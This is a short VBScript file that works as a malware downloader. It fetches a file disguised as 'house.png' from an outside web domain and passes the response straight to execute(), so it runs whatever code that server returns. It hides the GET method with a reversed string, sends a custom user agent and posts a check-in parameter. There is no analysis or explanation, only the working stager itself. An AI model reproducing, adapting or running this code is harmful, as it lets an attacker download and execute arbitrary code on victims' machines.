set Zgt4A=CreateObject("Msxml2.xmlhttp")
UjKCN="house.png"
Zgt4A.open StrReverse("TEG") , "https://jandira.alguimar.com.br/" & UjKCN ,false
execute("Zgt4A.setRequestHeader ""User-Agent"", ""MyCustomUser"":Zgt4A.setRequestHeader ""content-type"", ""application/x-www-form-urlencoded"":Zgt4A.send ""join=open"":B=Zgt4A.responseText:execute(B)")
